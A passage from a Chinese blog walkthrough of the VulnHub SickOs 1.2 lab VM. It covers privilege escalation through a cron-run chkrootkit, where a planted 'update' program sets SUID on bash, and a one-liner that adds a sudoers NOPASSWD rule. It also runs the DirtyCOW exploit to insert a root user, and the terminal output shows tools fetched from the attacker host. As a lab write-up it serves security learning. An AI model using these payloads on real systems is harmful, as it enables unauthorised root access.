+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ wget http://192.168.159.2:8080/pspy32</span><br><span class="line">--2024-12-20 13:42:30--  http://192.168.159.2:8080/pspy32</span><br><span class="line">Connecting to 192.168.159.2:8080... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2940928 (2.8M) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;pspy32&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 2,940,928   3.02M/s   <span class="keyword">in</span> 0.9s    </span><br><span class="line"></span><br><span class="line">2024-12-20 13:42:31 (3.02 MB/s) - <span class="string">&#x27;pspy32&#x27;</span> saved [2940928/2940928]</span><br><span class="line"></span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">chmod</span> +x pspy32 </span><br><span class="line">www-data@ubuntu:/tmp$ </span><br><span class="line">www-data@ubuntu:/tmp$ ./pspy32 </span><br><span class="line">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=<span class="literal">true</span>): processes=<span class="literal">true</span> | file-system-events=<span class="literal">false</span> ||| Scanning <span class="keyword">for</span> processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">2024/12/20 13:42:47 CMD: UID=0     PID=28195  | </span><br><span class="line">2024/12/20 13:42:47 CMD: UID=33    PID=12145  | ./pspy32 </span><br><span class="line">2024/12/20 13:42:47 CMD: UID=33    PID=10208  | /bin/bash </span><br><span class="line">2024/12/20 13:42:47 CMD: UID=33    PID=10207  | python -c import pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>) </span><br><span class="line">2024/12/20 13:42:47 CMD: UID=33    PID=10206  | sh -i </span><br><span class="line">2024/12/20 13:42:47 CMD: UID=33    PID=10202  | sh -c <span class="built_in">uname</span> -a; w; <span class="built_in">id</span>; sh -i </span><br><span class="line">2024/12/20 13:42:47 CMD: UID=33    PID=9241   | wget http://192.168.159.2:8000 </span><br><span class="line">2024/12/20 13:42:47 CMD: UID=0     PID=2505   | </span><br><span class="line">…………………</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412211208275.jpg" /></p>
+<p>可见 chkrootkit 确实被定时执行, 根据前面漏洞介绍临时目录下写个 update
+提权</p>
+<p>示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">cat</span> update.c </span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;  // For setuid() and setgid()</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;  // For system()</span></span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    setgid(0);       // Set the group ID to root (GID 0)</span><br><span class="line">    setuid(0);       // Set the user ID to root (UID 0)</span><br><span class="line">    system(<span class="string">&quot;chmod u+s /bin/bash&quot;</span>);  // setuid</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">www-data@ubuntu:/tmp$ gcc update.c -o update   </span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">ls</span> -al /bin/bash </span><br><span class="line">-rwsr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash</span><br><span class="line">www-data@ubuntu:/tmp$ </span><br><span class="line">www-data@ubuntu:/tmp$ /bin/bash -p</span><br><span class="line">bash-4.2<span class="comment"># id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) <span class="built_in">groups</span>=0(root),33(www-data)</span><br><span class="line">bash-4.2<span class="comment"># </span></span><br><span class="line">bash-4.2<span class="comment"># cd /root/</span></span><br><span class="line">bash-4.2<span class="comment"># </span></span><br><span class="line">bash-4.2<span class="comment"># ls -al</span></span><br><span class="line">total 76</span><br><span class="line">drwx------  4 root root  4096 Apr 26  2016 .</span><br><span class="line">drwxr-xr-x 22 root root  4096 Mar 30  2016 ..</span><br><span class="line">-rw-------  1 root root  3066 Apr 26  2016 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  3106 Apr 19  2012 .bashrc</span><br><span class="line">drwx------  2 root root  4096 Apr 12  2016 .cache</span><br><span class="line">-rw-r--r--  1 root root   140 Apr 19  2012 .profile</span><br><span class="line">-rw-r--r--  1 root root 39421 Apr  9  2015 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz</span><br><span class="line">-r--------  1 root root   491 Apr 26  2016 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">drwxr-xr-x  2 john john  4096 Apr 12  2016 chkrootkit-0.49</span><br><span class="line">-rw-r--r--  1 root root   541 Apr 25  2016 newRule</span><br><span class="line">bash-4.2<span class="comment"># </span></span><br><span class="line">bash-4.2<span class="comment"># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt </span></span><br><span class="line">WoW! If you are viewing this, You have <span class="string">&quot;Sucessfully!!&quot;</span> completed SickOs1.2, the challenge is more focused on elimination of tool <span class="keyword">in</span> real scenarios <span class="built_in">where</span> tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though <span class="keyword">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> giving this try.</span><br><span class="line"></span><br><span class="line">@vulnhub: Thanks <span class="keyword">for</span> hosting this UP!.</span><br><span class="line">bash-4.2<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<p>提权成功！</p>
+<p>此处利用 update 提权的方式很多，也可以修改 sudoers 提升 www-data
+权限，示例 update</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;%www-data ALL=(ALL) NOPASSWD:ALL&quot;</span> &gt;&gt; /etc/sudoers</span><br></pre></td></tr></table></figure>
+<p>实操可见：<a
+target="_blank" rel="noopener" href="https://juejin.cn/post/7305691872926646306#heading-12">【Vulnhub通关】SickOS：1.2准备工作
+靶机基本信息 环境配置 使用VMware软件打开靶机压缩包内的Sic - 掘金</a></p>
+<p>也可以利用 update 修改 /etc/passwd 权限，允许 www-data 新建 root
+权限用户，实操可见：<a
+target="_blank" rel="noopener" href="https://steflan-security.com/vulnhub-sickos-1-2-walkthrough/">VulnHub
+- SickOS 1.2 Walkthrough - Steflan's Security Blog</a></p>
+<h2 id="dirtycow-提权">7.  DirtyCOW 提权</h2>
+<p>前面尝试 DirtyCOW 提权靶机总会崩溃……</p>
+<p>可通过修改 /proc/sys/vm/dirty_writeback_centisecs 解决</p>
+<blockquote>
+<p>在 Linux 系统中，<code>/proc/sys/vm/dirty_writeback_centisecs</code>
+是一个虚拟文件，用于控制系统内核对脏页（dirty
+pages）的写回行为。脏页是指已经被修改但尚未写入磁盘的数据页。<br />
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/oceansw/article/details/78271187">linux
+IO 内核参数调优_io 内核调优-CSDN博客</a></p>
+</blockquote>
+<p><strong><em>vm.dirty_writeback_centisecs 参数</em></strong></p>
+<ul>
+<li>定义负责将脏数据写入硬盘的内核线程定期唤醒之间的时间间隔（指定了内核后台线程检查并将脏页刷新到磁盘的时间间隔）。<br />
+</li>
+<li>这个内核参数以 100 分之一秒为单位。<br />
+</li>
+<li>缺省数值是500，也就是 5 秒。</li>
+</ul>
+<p><strong><em>配置作用</em></strong></p>
+<ul>
+<li>内核后台线程会定期扫描脏页，按照一定的调度策略将它们写入磁盘。<br />
+</li>
+<li>调整这个值可以影响系统的性能和平衡：
+<ul>
+<li><strong>较小的值</strong>：后台线程更频繁地检查并写回脏页，会减少数据丢失的风险（例如突然断电），但可能会增加磁盘
+I/O 操作，降低性能。<br />
+</li>
+<li><strong>较大的值</strong>：后台线程更少地检查写回，有助于减少磁盘
+I/O
+操作，但如果发生意外（如断电或系统崩溃），数据丢失的风险会增加。</li>
+</ul></li>
+</ul>
+<p><strong><em>禁用内核后台写回线程</em></strong></p>
+<ul>
+<li>设置为 <code>0</code> 会禁用后台写回线程的定时调度。<br />
+</li>
+<li>后台线程将不再定期检查和写回脏页（dirty pages）到磁盘。</li>
+</ul>
+<p>实操测试（需 root 权限修改测试）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2<span class="comment"># id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) <span class="built_in">groups</span>=0(root),33(www-data)</span><br><span class="line">bash-4.2<span class="comment"># </span></span><br><span class="line">bash-4.2<span class="comment"># cat /proc/sys/vm/dirty_writeback_centisecs </span></span><br><span class="line">500</span><br><span class="line">bash-4.2<span class="comment"># echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs </span></span><br><span class="line">bash-4.2<span class="comment"># </span></span><br><span class="line">bash-4.2<span class="comment"># cat /proc/sys/vm/dirty_writeback_centisecs </span></span><br><span class="line">0</span><br><span class="line">bash-4.2<span class="comment"># </span></span><br><span class="line">bash-4.2<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">cd</span> /var/www/test/</span><br><span class="line">www-data@ubuntu:/var/www/test$ </span><br><span class="line">www-data@ubuntu:/var/www/test$ <span class="built_in">ls</span> -al dirty</span><br><span class="line">-rwxrwxrwx 1 www-data www-data 12466 Dec 20 12:21 dirty</span><br><span class="line">www-data@ubuntu:/var/www/test$ </span><br><span class="line">www-data@ubuntu:/var/www/test$ ./dirty </span><br><span class="line">/etc/passwd successfully backed up to /tmp/passwd.bak</span><br><span class="line">Please enter the new password: </span><br><span class="line">Complete line:</span><br><span class="line">firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">mmap: b7793000</span><br><span class="line">madvise 0</span><br><span class="line"></span><br><span class="line">ptrace 0</span><br><span class="line">Done! Check /etc/passwd to see <span class="keyword">if</span> the new user was created.</span><br><span class="line">You can <span class="built_in">log</span> <span class="keyword">in</span> with the username <span class="string">&#x27;firefart&#x27;</span> and the password <span class="string">&#x27;1234&#x27;</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DON<span class="string">&#x27;T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="string">Done! Check /etc/passwd to see if the new user was created.</span></span><br><span class="line"><span class="string">You can log in with the username &#x27;</span>firefart<span class="string">&#x27; and the password &#x27;</span>1234<span class="string">&#x27;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">DON&#x27;</span>T FORGET TO RESTORE! $ <span class="built_in">mv</span> /tmp/passwd.bak /etc/passwd</span><br><span class="line">www-data@ubuntu:/var/www/test$ <span class="built_in">cat</span> /etc/passwd | grep <span class="string">&quot;firefart&quot;</span></span><br><span class="line">Binary file (standard input) matches</span><br><span class="line">www-data@ubuntu:/var/www/test$ </span><br><span class="line">www-data@ubuntu:/var/www/test$ <span class="built_in">head</span> -n 3 /etc/passwd</span><br><span class="line">firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash</span><br><span class="line">/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">www-data@ubuntu:/var/www/test$ su firefart</span><br><span class="line">Password: </span><br><span class="line">firefart@ubuntu:/var/www/test<span class="comment"># id</span></span><br><span class="line">uid=0(firefart) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">firefart@ubuntu:/var/www/test<span class="comment"># cd /root</span></span><br><span class="line">firefart@ubuntu:~<span class="comment"># </span></span><br><span class="line">firefart@ubuntu:~<span class="comment"># ls -al</span></span><br><span class="line">total 76</span><br><span class="line">drwx------  4 firefart root  4096 Apr 26  2016 .</span><br><span class="line">drwxr-xr-x 22 firefart root  4096 Mar 30  2016 ..</span><br><span class="line">-rw-r--r--  1 firefart root 39421 Apr  9  2015 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz</span><br><span class="line">-r--------  1 firefart root   491 Apr 26  2016 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">-rw-------  1 firefart root  3066 Apr 26  2016 .bash_history</span><br><span class="line">-rw-r--r--  1 firefart root  3106 Apr 19  2012 .bashrc</span><br><span class="line">drwx------  2 firefart root  4096 Apr 12  2016 .cache</span><br><span class="line">drwxr-xr-x  2 john     john  4096 Apr 12  2016 chkrootkit-0.49</span><br><span class="line">-rw-r--r--  1 firefart root   541 Apr 25  2016 newRule</span><br><span class="line">-rw-r--r--  1 firefart root   140 Apr 19  2012 .profile</span><br><span class="line">firefart@ubuntu:~<span class="comment"># </span></span><br><span class="line">firefart@ubuntu:~<span class="comment"># ls -al /proc/sys/vm/dirty_writeback_centisecs </span></span><br><span class="line">-rw-r--r-- 1 firefart root 0 Dec 21 05:24 /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line">firefart@ubuntu:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<h2 id="iptables">8. Iptables</h2>
+<p>靶机防火墙规则</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">firefart@ubuntu:~<span class="comment"># iptables -L</span></span><br><span class="line">Chain INPUT (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp spt:http-alt</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp spt:https</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp spt:http</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http-alt</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https</span><br></pre></td></tr></table></figure>
+<p><strong><em>注解——ChatGPT</em></strong></p>
+<p><code>iptables -L</code>
+命令显示当前防火墙规则，其中每个规则按链（Chain）进行分类。这些链通常包括以下三类：</p>
+<ol type="1">
+<li><strong>INPUT</strong>：控制进入本机的数据包。</li>
+<li><strong>FORWARD</strong>：控制经过本机转发的数据包（本机并不是最终目的地）。</li>
+<li><strong>OUTPUT</strong>：控制从本机发出的数据包。</li>
+</ol>
+<p>每个链包含一系列规则，根据协议、源地址、目的地址、端口等条件，定义是否接受或丢弃数据包。</p>
+<p><strong>Chain INPUT (policy DROP)</strong><br />
+- 默认策略：<code>DROP</code> -
+如果数据包没有匹配到任何规则，则默认丢弃。<br />
+规则列表：<br />
+1. <code>ACCEPT tcp -- anywhere anywhere tcp dpt:ssh</code><br />
+- 接受目标端口（dpt）为 22（SSH）的 TCP 数据包。<br />
+- 意义：允许其他设备通过 SSH 连接到本机。<br />
+2. <code>ACCEPT tcp -- anywhere anywhere tcp dpt:http</code><br />
+- 接受目标端口为 80（HTTP）的 TCP 数据包。<br />
+- 意义：允许其他设备通过 HTTP（网页服务）访问本机。<br />
+3. <code>ACCEPT tcp -- anywhere anywhere tcp spt:http-alt</code><br />
+- 接受源端口（spt）为 8080（HTTP-alt）的 TCP 数据包。<br />
+- 意义：允许从源端口为 8080 的设备发送数据到本机（常用于代理或非标准
+HTTP 服务）。<br />
+4. <code>ACCEPT tcp -- anywhere anywhere tcp spt:https</code><br />
+- 接受源端口为 443（HTTPS）的 TCP 数据包。<br />
+- 意义：允许从源端口为 443 的设备发送加密数据到本机。</p>
+<p><strong>Chain FORWARD (policy ACCEPT)</strong><br />
+- 默认策略：<code>ACCEPT</code><br />
+- 转发链默认允许所有数据包通过。<br />
+规则列表：<br />
+- 该链没有具体规则，所有数据包都默认通过。</p>
+<p><strong>Chain OUTPUT (policy DROP)</strong><br />
+- 默认策略：<code>DROP</code><br />
+- 如果数据包没有匹配到任何规则，则默认丢弃。<br />
+规则列表：<br />
+1. <code>ACCEPT tcp -- anywhere anywhere tcp spt:ssh</code><br />
+- 接受源端口为 22（SSH）的 TCP 数据包。<br />
+- 意义：允许本机通过 SSH 与其他设备通信。<br />
+2. <code>ACCEPT tcp -- anywhere anywhere tcp spt:http</code><br />
+- 接受源端口为 80（HTTP）的 TCP 数据包。<br />
+- 意义：允许本机通过 HTTP 与其他设备通信。<br />
+3. <code>ACCEPT tcp -- anywhere anywhere tcp dpt:http-alt</code><br />
+- 接受目标端口为 8080（HTTP-alt）的 TCP 数据包。<br />
+- 意义：允许本机向目标端口为 8080 的设备发送数据。<br />
+4. <code>ACCEPT tcp -- anywhere anywhere tcp dpt:https</code><br />
+- 接受目标端口为 443（HTTPS）的 TCP 数据包。<br />
+- 意义：允许本机通过 HTTPS 与其他设备通信。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Phantom
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/12/21/SickOs%201.2/" title="VulnHub - SickOs: 1.2">https://z9m8r8.github.io/2024/12/21/SickOs 1.2/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/Insecure-File-Upload/" rel="tag"><i class="fa fa-tag"></i> Insecure File Upload</a>
+              <a href="/tags/Crontab/" rel="tag"><i class="fa fa-tag"></i> Crontab</a>
+              <a href="/tags/Dirty-COW/" rel="tag"><i class="fa fa-tag"></i> Dirty COW</a>
+              <a href="/tags/SUID-%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> SUID 提权</a>
+              <a href="/tags/Iptables/" rel="tag"><i class="fa fa-tag"></i> Iptables</a>
+              <a href="/tags/SSH/" rel="tag"><i class="fa fa-tag"></i> SSH</a>
+              <a href="/tags/HTTP-PUT-Method/" rel="tag"><i class="fa fa-tag"></i> HTTP PUT Method</a>
+              <a href="/tags/Chkrootkit/" rel="tag"><i class="fa fa-tag"></i> Chkrootkit</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/12/19/HackLAB%20Vulnix/" rel="prev" title="VulnHub - HackLAB: Vulnix">
+                  <i class="fa fa-angle-left"></i> VulnHub - HackLAB: Vulnix
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Phantom</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">359k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:47</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/12/21/SickOs%201.2/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
